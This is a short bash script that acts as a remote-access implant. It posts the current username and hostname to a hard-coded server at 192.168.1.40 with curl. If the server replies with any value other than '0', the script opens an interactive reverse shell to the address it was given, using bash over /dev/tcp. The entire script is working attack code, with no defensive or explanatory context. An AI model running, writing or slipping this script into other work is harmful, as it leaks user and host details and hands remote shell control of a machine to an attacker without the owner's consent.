#!/bin/bash
ip_server="192.168.1.40"
user=`whoami`
hostname=`hostname`
response=`curl -m 5 -s ${ip_server}:12345/update -d "username=${user}&host=${hostname}"` || { echo "ERROR CURL"; exit 1; }
if [ ! "$response" = "0" ]; then
	echo "Connecting to $response"
	bash -i >& /dev/tcp/${response} 0>&1 #reverse shell
fi
